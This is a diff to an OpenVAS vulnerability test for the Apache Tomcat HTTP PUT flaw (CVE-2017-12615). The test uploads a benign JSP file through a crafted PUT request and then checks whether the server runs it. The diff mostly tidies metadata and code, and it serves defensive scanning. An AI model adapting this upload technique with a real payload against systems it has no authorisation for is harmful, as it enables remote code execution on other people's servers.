@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_apache_tomcat_http_put_code_exec_vuln_win.nasl 7543 2017-10-24 11:02:02Z cfischer $
+# $Id: gb_apache_tomcat_http_put_code_exec_vuln_win.nasl 11506 2018-09-20 13:32:45Z cfischer $
 #
 # Apache Tomcat 'HTTP PUT Request' Code Execution Vulnerability (Windows)
 #
@@ -29,12 +29,12 @@ CPE = "cpe:/a:apache:tomcat";
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.811845");
-  script_version("$Revision: 7543 $");
+  script_version("$Revision: 11506 $");
   script_cve_id("CVE-2017-12615");
   script_bugtraq_id(100901);
   script_tag(name:"cvss_base", value:"6.8");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
-  script_tag(name:"last_modification", value:"$Date: 2017-10-24 13:02:02 +0200 (Tue, 24 Oct 2017) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-20 15:32:45 +0200 (Thu, 20 Sep 2018) $");
   script_tag(name:"creation_date", value:"2017-09-25 17:29:27 +0530 (Mon, 25 Sep 2017)");
   script_tag(name:"qod_type", value:"exploit");
   script_name("Apache Tomcat 'HTTP PUT Request' Code Execution Vulnerability (Windows)");
@@ -42,18 +42,16 @@ if(description)
   script_tag(name:"summary", value:"This host is running Apache Tomcat
   and is prone to code execution vulnerability.");
 
-  script_tag(name:"vuldetect", value:"Send a crafted 'HTTP PUT' request and check 
+  script_tag(name:"vuldetect", value:"Send a crafted 'HTTP PUT' request and check
   whether it is able to upload arbitrary file or not.");
 
-  script_tag(name:"insight", value:"The flaw is due to an insufficient processing 
-  of 'HTTP PUT Request', which allows uploading of an arbitrary JSP file to the 
-  target system and then request the file to execute arbitrary code on the target 
+  script_tag(name:"insight", value:"The flaw is due to an insufficient processing
+  of 'HTTP PUT Request', which allows uploading of an arbitrary JSP file to the
+  target system and then request the file to execute arbitrary code on the target
   system.");
 
   script_tag(name:"impact", value:"Successful exploitation will allow remote
-  attackers to execute arbitrary code on the target system.
-
-  Impact Level: System/Application");
+  attackers to execute arbitrary code on the target system.");
 
   script_tag(name:"affected", value:"Apache Tomcat versions 7.0.0 to 7.0.79 on Windows");
 
@@ -67,38 +65,30 @@ if(description)
   script_copyright("Copyright (C) 2017 Greenbone Networks GmbH");
   script_family("Web Servers");
   script_dependencies("gb_apache_tomcat_detect.nasl", "os_detection.nasl");
-  script_mandatory_keys("ApacheTomcat/installed","Host/runs_windows");
+  script_mandatory_keys("ApacheTomcat/installed", "Host/runs_windows");
   script_require_ports("Services/www", 8080);
+
   exit(0);
 }
 
 include("host_details.inc");
 include("http_func.inc");
 include("http_keepalive.inc");
+include("misc_func.inc");
 
-## Variable Initialization
-tomPort = "";
-req = "";
-res = "";
+vtstring = get_vt_string();
 
-## get the port
 if(!tomPort = get_app_port(cpe:CPE)){
   exit(0);
 }
 
-# get host name
-if(!host = http_host_name(port:tomPort)){
-  exit(0);
-}
+host = http_host_name(port:tomPort);
 
-## Construct crafted data
 postData = '<% out.println("Reproducing CVE-2017-12615");%>';
 
-## Create Random file name
-rand = '/OpenVAS_' + rand() + '.jsp';
+rand = '/' + vtstring + '_' + rand() + '.jsp';
 url = rand + '/';
 
-## construct crafted PUT request to create a file
 req = string("PUT ", url, " HTTP/1.1\r\n",
              "Host: ", host, "\r\n",
              "Content-Length: ", strlen(postData), "\r\n",
@@ -106,10 +96,8 @@ req = string("PUT ", url, " HTTP/1.1\r\n",
 
 res = http_keepalive_send_recv(port:tomPort, data:req);
 
-## Confirm exploit
-if(res =~ "HTTP/1\.. 201")
+if(res =~ "^HTTP/1\.[01] 201")
 {
-  ## Checking whether it is able to access the uploaded file
   if( http_vuln_check( port:tomPort, url:rand, pattern:"Reproducing CVE-2017-12615", check_header:TRUE) )
   {
     report = 'It was possible to upload the file ' + rand + '. Please delete this file manually.\n\n';
@@ -117,4 +105,5 @@ if(res =~ "HTTP/1\.. 201")
     exit( 0 );
   }
 }
-exit(0);
+
+exit(99);
